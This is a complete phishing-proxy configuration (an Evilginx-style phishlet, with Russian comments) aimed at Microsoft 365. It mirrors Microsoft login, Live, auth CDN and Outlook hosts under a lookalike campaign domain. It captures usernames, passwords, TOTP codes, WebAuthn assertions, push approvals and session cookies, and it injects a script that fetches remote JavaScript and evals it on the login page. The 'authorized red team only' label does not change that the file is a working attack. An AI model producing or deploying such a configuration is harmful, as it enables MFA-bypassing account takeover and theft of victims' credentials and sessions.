# Microsoft 365 phishlet MAX (Phantom v2). Только авторизованный Red Team.
# Перехват: логин + пароль + TOTP/Push/WebAuthn + сессионные токены +
# post-login OWA (сессия остается под нашим хостом).
# Авто-инжект fingerprint-challenge (best-effort, может резаться CSP).
id: microsoft365
version: 2
base_domains:
  - "verdebudget.ru" # REPLACE-ME: боевой домен кампании
proxy_hosts:
  - phish_sub: "m365"
    orig_sub: "login"
    domain: "microsoftonline.com"
    is_landing: true
  - phish_sub: "live"
    orig_sub: "login"
    domain: "live.com"
    is_landing: false
  - phish_sub: "msauth"
    orig_sub: "aadcdn"
    domain: "msauth.net"
    is_landing: false
  - phish_sub: "msauthimg"
    orig_sub: "aadcdn"
    domain: "msftauthimages.net"
    is_landing: false
  - phish_sub: "owa"
    orig_sub: "outlook"
    domain: "office365.com"
    is_landing: false
sub_filters:
  - triggers_on: "login.microsoftonline.com"
    search: "login.microsoftonline.com"
    replace: "m365.verdebudget.ru"
    mime: ["text/html", "application/json"]
    redirect_only: false
  - triggers_on: "login.live.com"
    search: "login.live.com"
    replace: "live.verdebudget.ru"
    mime: ["text/html", "application/json"]
    redirect_only: false
  - triggers_on: "aadcdn.msauth.net"
    search: "aadcdn.msauth.net"
    replace: "msauth.verdebudget.ru"
    mime: ["text/html", "text/css", "application/json", "javascript"]
    redirect_only: false
  - triggers_on: "aadcdn.msftauthimages.net"
    search: "aadcdn.msftauthimages.net"
    replace: "msauthimg.verdebudget.ru"
    mime: ["text/html", "text/css", "application/json", "javascript"]
    redirect_only: false
  - triggers_on: "outlook.office365.com"
    search: "outlook.office365.com"
    replace: "owa.verdebudget.ru"
    mime: ["text/html", "application/json"]
    redirect_only: false
auth_tokens:
  - domain: ".microsoftonline.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "buid"]
  - domain: ".live.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie", "buid"]
  - domain: ".office365.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
creds_map:
  - key: "login"
    search: "loginfmt"
  - key: "passwd"
    search: "passwd"
  - key: "passwd"
    search: "password"
mfa_tokens:
  - key: "totp"
    search: "otc"
  - key: "totp"
    search: "totpPin"
  - key: "webauthn"
    search: "authenticatorAssertionResponse"
  - key: "webauthn"
    search: "publicKeyCredential"
  - key: "push"
    search: "Approve"
js_inject:
  - trigger: "login.microsoftonline.com"
    src: "fetch('/__fp.js').then(r=>r.text()).then(eval).catch(()=>{});"
lure_path: "/l/m365-01"
enabled: true
